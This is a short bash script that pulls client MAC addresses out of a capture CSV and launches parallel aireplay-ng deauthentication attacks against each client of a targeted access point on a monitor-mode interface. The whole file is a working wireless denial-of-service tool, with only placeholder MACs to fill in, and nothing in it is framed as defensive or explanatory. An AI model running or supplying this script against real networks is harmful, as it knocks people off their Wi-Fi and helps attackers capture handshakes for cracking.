#!/bin/bash

MACS=( $(cat tmux-$1.csv | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | grep -v "xx:xx:xx:xx:xx:xx" | grep -v "yy:yy:yy:yy:yy:yy" | sort | uniq))

for mac in "${MACS[@]}"
do
    
	echo "$mac";
done| xargs -P0 -I {} aireplay-ng -0 10 -a zz:zz:zz:zz:zz:zz -c {} wlan0mon --ignore-negative-one
